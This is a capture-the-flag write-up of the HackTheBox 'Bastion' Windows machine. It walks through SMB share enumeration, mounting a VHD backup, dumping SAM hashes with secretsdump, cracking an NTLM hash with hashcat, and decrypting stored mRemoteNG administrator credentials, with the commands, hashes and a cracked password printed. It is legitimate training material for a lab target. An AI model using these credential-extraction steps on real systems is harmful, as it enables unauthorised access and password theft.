---
title: "HackTheBox - Bastion"
author: Nasrallah
description: ""
date: 2023-03-17 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy]
img_path: /assets/img/hackthebox/machines/bastion
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Bastion](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.134                                                                                                                       [3/61]
Host is up (0.30s latency).                                                                                                                                   
Not shown: 996 closed tcp ports (reset)                                                                                                                       
PORT    STATE SERVICE      VERSION                                                                                                                            
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a56ae753c780ec8564dcb1c22bf458a (RSA)
|   256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA)
|_  256 935f5daaca9f53e7f282e664a8a3a018 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-12T20:15:15+01:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: -19m59s, deviation: 34m36s, median: 0s
| smb2-time: 
|   date: 2023-03-12T19:15:13
|_  start_date: 2023-03-12T19:08:51
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

We have OpenSSH running on port 22 and SMB on it's default ports.

### SMB

Let's enumerate shares using `smbmap`

```terminal
$ smbmap -H 10.10.10.134        
[!] Authentication error on 10.10.10.134
```

We couldn't authenticate because `smbmap` tries anonymous access, let's try again using a random username

```terminal
$ smbmap -H 10.10.10.134 -u asdf   
[+] Guest session       IP: 10.10.10.134:445    Name: 10.10.10.134                                      
[\] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\YSBDOXQIZJ, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC

```

We found the share `Backups` and it's readable.

Let's connect to `Backups`.

```bash
$ sudo smbclient //10.10.10.134/backups -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 14 18:56:34 2023
  ..                                  D        0  Tue Mar 14 18:56:34 2023
  note.txt                           AR      116  Tue Apr 16 11:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 13:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 13:44:02 2019

                5638911 blocks of size 4096. 1178625 blocks available
smb: \> 
```

We found a note.txt file and WindowsImageBackup which is a backup that contains an image copy of the windows files.

The note contains the following image.

```notes
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

The note informs us that the backup might be large and it would take a lot if time to download it.

Checking the WindowsImageBackup directory we find two interesting file.

![](1.png)

There are two .vhd files which are virtual hard disk file, we can also see that the size of the files is very big.

Instead of downloading the files, let's mount the backup directory.

```terminal
$ sudo mount -t cifs //10.10.10.134/backups /mnt/bastion                   
Password for root@//10.10.10.134/backups: 
```

Searching for ways to enumerate the hard disk vhd file, i came across this [article](https://infinitelogins.com/2020/12/11/how-to-mount-extract-password-hashes-vhd-files/) showcasing how to get SAM SYSTEM and dump passwords.

First we need to mount one of the vhd file, the one we'll use is `9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd` because it's the larger one meaning it's the windows file system root.

```terminal
guestmount --add /mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /tmp/winbak
```

![](2.png)


## **Foothold**

Great! now we go to `Windows/system32/config` and copy the SAM and SYSTEM files to our machine and then extract the hashes using `impacket secretsdump.py`

```terminal
$ secretsdump.py -sam SAM -system SYSTEM local                           
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

```

We got L4mpje hash, let's crack it using `hashcat`

```terminal
$ hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

26112010952d963c8dc4217daec986d9:bureaulampje    
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 26112010952d963c8dc4217daec986d9
Time.Started.....: Tue Mar 14 20:10:53 2023 (5 secs)
Time.Estimated...: Tue Mar 14 20:10:58 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2004.9 kH/s (0.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9396224/14344385 (65.50%)
Rejected.........: 0/9396224 (0.00%)
Restore.Point....: 9392128/14344385 (65.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: burrote -> burbank105

Started: Tue Mar 14 20:10:16 2023
Stopped: Tue Mar 14 20:11:00 2023

```

With the password, let's ssh to the target.

![](3.png)


## **Privilege Escalation**

Checking the installed program on the machine we find something interesting.

```terminal
PS C:\> cd '.\Program Files (x86)\'                                                                                             
PS C:\Program Files (x86)> ls                                                                                                   


    Directory: C:\Program Files (x86)                                                                                           


Mode                LastWriteTime         Length Name                                                                           
----                -------------         ------ ----                                                                           
d-----        16-7-2016     15:23                Common Files                                                                   
d-----        23-2-2019     09:38                Internet Explorer                                                              
d-----        16-7-2016     15:23                Microsoft.NET                                                                  
da----        22-2-2019     14:01                mRemoteNG                                                                      
d-----        23-2-2019     10:22                Windows Defender                                                               
d-----        23-2-2019     09:38                Windows Mail                                                                   
d-----        23-2-2019     10:22                Windows Media Player                                                           
d-----        16-7-2016     15:23                Windows Multimedia Platform                                                    
d-----        16-7-2016     15:23                Windows NT                                                                     
d-----        23-2-2019     10:22                Windows Photo Viewer                                                           
d-----        16-7-2016     15:23                Windows Portable Devices                                                       
d-----        16-7-2016     15:23                WindowsPowerShell                                                              
```

There is program called `mRemoteNG` which after some research we find it's a an open source project (https://github.com/rmcardle/mRemoteNG) that provides a full-featured, multi-tab remote connections manager.

Searching for ways to exploit this program i found this [article](https://vk9-sec.com/exploiting-mremoteng/) showing how to do so.

the `mRemoteNG` program has a file in `%appdata%` called `confCons.xml` that contains passwords.

![](4.png)

We found an Administrator password but it is encrypted, the article suggests this [tool](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password.

![](5.png)

We managed to decrypt the file and get the administrator password that we used to ssh to the target.


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
